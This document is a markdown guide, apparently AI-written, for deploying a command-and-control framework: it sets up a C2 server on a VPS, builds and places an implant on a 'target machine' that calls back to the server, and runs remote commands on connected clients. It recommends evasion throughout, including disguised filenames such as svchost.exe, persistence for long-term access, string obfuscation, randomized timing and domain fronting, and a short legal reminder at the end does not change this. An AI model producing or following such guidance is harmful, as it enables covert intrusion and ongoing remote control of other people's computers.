# 🚀 Production C2 Deployment Guide

## 📋 **Server Setup (Your VPS/Cloud)**

### **1. Prepare Your Server**
```bash
# On your VPS/Cloud server (Linux):
sudo ufw allow 4444/tcp        # Allow C2 port
sudo ufw enable

# Upload c2_server to your VPS
scp c2_server.exe user@YOUR_VPS_IP:/home/user/
```

### **2. Run C2 Server on VPS**
```bash
# On your VPS:
chmod +x c2_server
./c2_server

# Or in background:
nohup ./c2_server > c2.log 2>&1 &
```

## 🎯 **Client Configuration (Target Machine)**

### **Option 1: Quick Command Line (Testing)**
```bash
# Replace YOUR_VPS_IP with your actual server IP
c2_client.exe --server YOUR_VPS_IP --no-stealth --no-persistence
```

### **Option 2: Production Configuration Script (Recommended)**
```bash
# Run the configuration script
.\configure_production.bat

# Follow prompts:
# - Enter your VPS IP (e.g., 203.0.113.10)
# - Script will build and package everything
```

### **Option 3: Manual Source Code Edit**
```bash
# 1. Edit c2_client\src\main.rs
# Replace "YOUR_VPS_IP" with your actual IP

# 2. Rebuild
.\build.bat

# 3. Deploy
copy output\c2_client.exe to target machine
```

## 🔧 **Configuration Examples**

### **For Domain Names:**
```rust
// In main.rs:
default_value = "myc2server.com"
obfuscate_string("myc2server.com")
```

### **For IP Addresses:**
```rust
// In main.rs:
default_value = "203.0.113.10"
obfuscate_string("203.0.113.10")
```

### **For Custom Ports:**
```rust
// In main.rs:
default_value_t = 8080    // Change from 4444
```

## 🚨 **Security Considerations**

### **Server Hardening:**
- Use strong firewall rules
- Consider using non-standard ports
- Monitor server logs
- Use VPN or proxy for access

### **Client Deployment:**
- Test in isolated environment first
- Use disguised filenames (svchost.exe, etc.)
- Enable persistence for long-term access
- Monitor for detection

### **Network Security:**
- All traffic is encrypted (RSA + AES)
- No plaintext indicators
- Randomized timing to avoid detection
- Consider using domain fronting

## 📝 **Quick Reference Commands**

```bash
# Configure for production
.\configure_production.bat

# Test connectivity
telnet YOUR_VPS_IP 4444

# Deploy client (stealth mode)
c2_client.exe

# Deploy client (debug mode)
c2_client.exe --server YOUR_VPS_IP --no-stealth --no-persistence

# Server admin commands
C2> clients                    # List connected clients
C2> exec <client_id> whoami    # Execute command
C2> results <client_id>        # View results
```

## ⚖️ **Legal Reminder**

- ✅ **Only use on systems you own or have written authorization to test**
- ✅ **Follow responsible disclosure for any findings**
- ❌ **Never use for unauthorized access or malicious purposes**
- 📋 **Document all testing activities thoroughly**

---

**Your production C2 framework is ready for authorized security testing!** 🎉
